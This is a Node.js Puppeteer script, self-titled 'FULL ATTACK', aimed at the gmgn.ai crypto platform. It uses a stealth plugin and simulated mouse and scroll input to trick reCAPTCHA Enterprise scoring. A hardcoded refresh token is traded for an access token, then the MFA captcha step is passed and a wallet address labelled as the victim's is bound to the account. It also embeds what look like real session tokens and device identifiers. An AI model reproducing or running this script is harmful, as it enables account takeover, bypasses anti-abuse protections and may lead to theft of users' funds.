/**
 * FULL ATTACK — Server-side execution with Puppeteer stealth
 * 
 * The issue was reCAPTCHA scoring us low. Solution:
 * 1. Load page normally, wait longer for good session
 * 2. Interact with the page (scroll, move mouse) to build reputation
 * 3. Wait for reCAPTCHA to warm up before executing
 * 4. Use the correct action name that gmgn uses
 */
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const ORIG_REFRESH = 'eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiJhMWQ2ZGZlNC1iODhmLTRjNTgtOThkYi00MmU0MmFhMjRmZDYiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxNS0yMTYxLTE4ZDViMTAiLCJkZXZpY2VfaWQiOiJkZTYyMGE1Ny1kOThlLTQyOTMtYjAwNy01ZDMxNTQ1NWUyMWQiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxNTMyNDdiOWUwZTE4NGZiZWQzZmFjNzNmMTlkY2E2OGEiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2NzUyNDIxLCJpYXQiOjE3ODQxNjA0MjEsImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiOGI5MGIxMzktODAzYi00NDNiLWE4OWYtYTIyYTgwYmE2OGI2IiwibmJmIjoxNzg0MTYwNDIxLCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiYTFkNmRmZTQtYjg4Zi00YzU4LTk4ZGItNDJlNDJhYTI0ZmQ2IiwidmVyIjoiMS4wIn0.5G4VW1NtqC9JPF-gaEnIE3bjOp1KIA01ROcTEoIy7QxQzwKIJJy37Zit7ON5TrXyyCZFNSt2cHbbj6z1_jijMA';
const TARGET = '5KCVo4xnj8n38FUyF2gFUzgJbDW9vV4C1bTpciznyciU';
const SITEKEY = '6Lf3pucqAAAAADbq3czpqDHRAD8j3kC-hcwwDG_T';
const PARAMS = 'device_id=de620a57-d98e-4293-b007-5d315455e21d&fp_did=4e8cc7f90484bd356291ff79db6b9b09&client_id=gmgn_web_20260715-2161-18d5b10&from_app=gmgn&app_ver=20260715-2161-18d5b10&tz_name=Asia%2FAden&tz_offset=10800&app_lang=en-US&os=web&worker=0';

(async () => {
    console.log('🔥 FULL ATTACK — HUMAN-LIKE BROWSING + CAPTCHA SOLVE');
    
    const browser = await puppeteer.launch({
        headless: 'new',
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--window-size=1920,1080',
            '--disable-blink-features=AutomationControlled'
        ]
    });
    
    const page = await browser.newPage();
    await page.setViewport({width: 1920, height: 1080});
    
    // Set realistic user agent
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36');
    
    console.log('[1] Loading gmgn.ai...');
    await page.goto('https://gmgn.ai', {waitUntil: 'networkidle2', timeout: 30000});
    
    // Simulate human behavior - scroll, move mouse, wait
    console.log('[2] Simulating human behavior...');
    await page.mouse.move(500, 300);
    await new Promise(r => setTimeout(r, 1000));
    await page.mouse.move(800, 400);
    await new Promise(r => setTimeout(r, 1000));
    await page.evaluate(() => window.scrollBy(0, 300));
    await new Promise(r => setTimeout(r, 2000));
    await page.evaluate(() => window.scrollBy(0, -100));
    await new Promise(r => setTimeout(r, 2000));
    await page.mouse.click(600, 350);
    await new Promise(r => setTimeout(r, 3000));
    
    console.log('[3] Page ready, executing attack...');
    
    const result = await page.evaluate(async (refresh, params, target, sitekey) => {
        const log = [];
        
        try {
            // Token
            let r = await fetch('/account/account/refresh_access_token', {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({refresh_token: refresh})
            });
            let text = await r.text();
            let data;
            try { data = JSON.parse(text); } catch(e) { return {error: 'non-json', text: text.substring(0,200)}; }
            if (data.code !== 0) return {error: 'token fail', data};
            const token = data.data.data.token;
            const h = {'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token};
            log.push('✅ Token');
            
            // Generate txn_id with VICTIM address
            r = await fetch('/account/account/generate_mfa_params?' + params, {
                method: 'POST', headers: h,
                body: JSON.stringify({usage: 'bind_wallet', biz_params: {address: target, wallet_type: 'sol', chain: 'sol'}})
            });
            data = await r.json();
            if (data.code !== 0) return {error: 'mfa fail: ' + data.message, log};
            const txnId = data.data.data.txn_id;
            log.push('✅ txn_id: ' + txnId);
            
            // fetch_captcha → request_id
            r = await fetch('/account/mfa/txn/v1/fetch_captcha?' + params, {
                method: 'POST', headers: h,
                body: JSON.stringify({usage: 'bind_wallet', txn_id: txnId})
            });
            data = await r.json();
            if (data.code !== 0) return {error: 'fetch_captcha fail', data, log};
            const requestId = data.data.request_id;
            log.push('✅ request_id: ' + requestId);
            
            // Load reCAPTCHA if not loaded
            if (!window.grecaptcha || !window.grecaptcha.enterprise) {
                await new Promise(resolve => {
                    const s = document.createElement('script');
                    s.src = 'https://www.recaptcha.net/recaptcha/enterprise.js?render=' + sitekey;
                    s.onload = () => setTimeout(resolve, 3000);
                    document.head.appendChild(s);
                    setTimeout(resolve, 10000);
                });
            }
            
            if (!window.grecaptcha || !window.grecaptcha.enterprise) {
                return {error: 'reCAPTCHA not loaded', log};
            }
            log.push('✅ reCAPTCHA loaded');
            
            // Wait a bit more for good score
            await new Promise(r => setTimeout(r, 3000));
            
            // Execute captcha with action matching what gmgn uses
            let captchaToken = await new Promise((resolve, reject) => {
                grecaptcha.enterprise.ready(async () => {
                    try {
                        // Try 'verify' action which is what gmgn.ai frontend uses
                        const t = await grecaptcha.enterprise.execute(sitekey, {action: 'verify'});
                        resolve(t);
                    } catch(e) { reject(e); }
                });
                setTimeout(() => reject('timeout'), 15000);
            });
            log.push('✅ Captcha token: ' + captchaToken.substring(0, 40));
            
            // Verify captcha
            r = await fetch('/account/mfa/txn/v1/verify_captcha?' + params, {
                method: 'POST', headers: h,
                body: JSON.stringify({
                    txn_id: txnId,
                    request_id: requestId,
                    usage: 'bind_wallet',
                    captcha_type: 'recaptcha_score',
                    captcha_data: captchaToken
                })
            });
            data = await r.json();
            log.push('Verify: code=' + data.code + ' msg=' + (data.message||''));
            
            if (data.code === 0) {
                log.push('💀💀💀 CAPTCHA PASSED!');
                
                // BIND THE WALLET
                r = await fetch('/account/bind_wallet?' + params, {
                    method: 'POST', headers: h,
                    body: JSON.stringify({address: target, wallet_type: 'sol', chain: 'sol', txn_id: txnId})
                });
                data = await r.json();
                log.push('BIND: ' + JSON.stringify(data));
                
                return {log, captchaPassed: true, bindResult: data, SUCCESS: data.code === 0};
            }
            
            return {log, txnId, requestId, verifyCode: data.code, verifyMsg: data.message};
        } catch(e) {
            return {error: e.message, log};
        }
    }, ORIG_REFRESH, PARAMS, TARGET, SITEKEY);
    
    console.log('\nRESULT:', JSON.stringify(result, null, 2));
    await browser.close();
})();
